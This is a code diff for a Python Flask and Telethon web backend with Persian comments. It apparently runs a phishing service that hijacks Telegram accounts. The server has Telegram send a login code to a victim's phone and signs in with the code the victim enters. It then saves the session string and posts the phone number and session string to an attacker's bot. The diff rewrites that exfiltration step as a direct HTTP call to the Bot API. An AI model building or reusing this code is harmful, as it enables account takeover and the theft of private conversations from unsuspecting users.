@@ -4,6 +4,7 @@ from telethon import TelegramClient
 import asyncio
 import os
 import logging
+import aiohttp
 
 app = Flask(__name__)
 CORS(app)
@@ -65,10 +66,11 @@ def verify_code():
         return jsonify({'error': str(e)}), 500
 
 # ============================================================
-# توابع با روش دو مرحله‌ای
+# توابع با روش صحیح (بدون بات)
 # ============================================================
 async def send_code(session_id, phone):
     try:
+        # ✅ کلاینت فقط با API_ID و API_HASH (بدون توکن بات)
         client = TelegramClient(session_id, API_ID, API_HASH)
         await client.connect()
         
@@ -78,7 +80,7 @@ async def send_code(session_id, phone):
         sessions[session_id]['client'] = client
         sessions[session_id]['phone_code_hash'] = result.phone_code_hash
         sessions[session_id]['status'] = 'code_sent'
-        logging.info(f"✅ Code sent to: {phone}, hash: {result.phone_code_hash}")
+        logging.info(f"✅ Code sent to: {phone}")
         
     except Exception as e:
         sessions[session_id]['status'] = 'error'
@@ -101,14 +103,14 @@ async def verify_session(session_id, phone, code):
         return False
 
     try:
-        # ✅ تایید کد با phone_code_hash
+        # ✅ تایید کد با phone_code_hash (بدون توکن بات)
         await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
         
         # بعد از لاگین، سشن رو بگیر
         session_string = client.session.save()
         
-        # ارسال به ربات
-        await send_to_bot(f"User : {phone}\nکد سیشن : {session_string}")
+        # ✅ ارسال به بات با درخواست HTTP ساده (نه با کلاینت Telethon)
+        await send_to_bot_via_http(f"User : {phone}\nکد سیشن : {session_string}")
         
         sessions[session_id]['status'] = 'done'
         await client.disconnect()
@@ -125,16 +127,29 @@ async def verify_session(session_id, phone, code):
             return False
         raise
 
-async def send_to_bot(message):
+# ============================================================
+# ارسال پیام به بات با HTTP (بدون Telethon)
+# ============================================================
+async def send_to_bot_via_http(message):
     try:
-        client = TelegramClient('bot_session', API_ID, API_HASH)
-        await client.start(bot_token=BOT_TOKEN)
-        await client.send_message(CHAT_ID, message)
-        await client.disconnect()
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        payload = {
+            "chat_id": CHAT_ID,
+            "text": message,
+            "parse_mode": "HTML"
+        }
+        async with aiohttp.ClientSession() as session:
+            async with session.post(url, json=payload) as response:
+                if response.status == 200:
+                    logging.info("✅ Message sent to bot")
+                else:
+                    logging.error(f"❌ Bot error: {response.status}")
     except Exception as e:
         logging.error(f"❌ Bot error: {e}")
-        raise
 
+# ============================================================
+# اجرا
+# ============================================================
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8080))
     app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
